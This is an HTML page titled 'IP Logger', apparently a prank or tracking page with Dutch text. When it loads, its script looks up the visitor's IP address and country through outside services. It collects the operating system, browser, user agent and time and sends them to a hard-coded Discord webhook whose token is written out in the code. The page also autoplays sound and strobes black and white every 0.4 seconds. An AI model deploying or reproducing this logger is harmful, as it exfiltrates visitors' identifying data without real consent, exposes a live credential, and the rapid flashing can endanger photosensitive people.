<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: white;
            color: black;
            animation: changeBackground 0.4s infinite;
            position: relative;
        }
        h1 {
            color: inherit;
        }
        p {
            color: inherit;
            margin-bottom: 40px;
        }
        @keyframes changeBackground {
            0% { background-color: white; color: black; }
            50% { background-color: black; color: white; }
            100% { background-color: white; color: black; }
        }
    </style>
    <script>
        var embedSent = false;
        var musicStarted = false;

        var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";

        function startMusic() {
            if (!musicStarted) {
                var audio = new Audio('sound.mp3');
                audio.play();
                musicStarted = true;
            }
        }

        function sendToDiscord() {
            var ipAddress = "Unknown"; // Default value for IP address
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ipAddress = data.ip;
                    fetch('https://ipapi.co/' + ipAddress + '/json/')
                        .then(response => response.json())
                        .then(locationData => {
                            sendEmbed(ipAddress, locationData);
                        })
                        .catch(error => {
                            console.error('Unable to fetch location data:', error);
                            sendEmbed(ipAddress, null); // Send embed with default location data
                        });
                })
                .catch(error => {
                    console.error('Unable to fetch IP address:', error);
                    sendEmbed(ipAddress, null); // Send embed with default IP address
                });
        }

        function sendEmbed(ipAddress, locationData) {
            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            var os = detectOS(userAgent);
            var browser = detectBrowser(userAgent);

            var country = (locationData && locationData.country_name) ? locationData.country_name : "Onbekend";

            var embed = {
                "embeds": [
                    {
                        "title": "IP Logger",
                        "description": "Een gebruiker heeft de pagina bezocht.",
                        "color": 65280, // Groen als het leuk vond, Rood als niet leuk
                        "fields": [
                            {
                                "name": "IP Adres",
                                "value": ipAddress,
                                "inline": true
                            },
                            {
                                "name": "Land",
                                "value": country,
                                "inline": true
                            },
                            {
                                "name": "Besturingssysteem",
                                "value": os,
                                "inline": true
                            },
                            {
                                "name": "Browser",
                                "value": browser,
                                "inline": true
                            },
                            {
                                "name": "Gebruikersagent",
                                "value": userAgent,
                                "inline": false
                            },
                            {
                                "name": "Tijdstip",
                                "value": timestamp,
                                "inline": true
                            }
                        ]
                    }
                ]
            };

            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(embed));
        }

        function detectOS(userAgent) {
            var OSes = [
                'Windows',
                'Mac OS',
                'Linux',
                'iOS',
                'Android'
            ];

            var detectedOS = OSes.find(function(os) {
                return userAgent.indexOf(os) >= 0;
            });

            return detectedOS || 'Onbekend';
        }

        function detectBrowser(userAgent) {
            var browsers = [
                'Chrome',
                'Firefox',
                'Safari',
                'Edge',
                'Opera'
            ];

            var detectedBrowser = browsers.find(function(browser) {
                return userAgent.indexOf(browser) >= 0;
            });

            return detectedBrowser || 'Onbekend';
        }

        window.onload = function() {
            startMusic(); // Start muziek direct bij het laden van de pagina
            sendToDiscord();
        }
    </script>
</head>
<body>
    <h1>Welkom bij onze geweldige site!</h1>
    <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
</body>
</html>
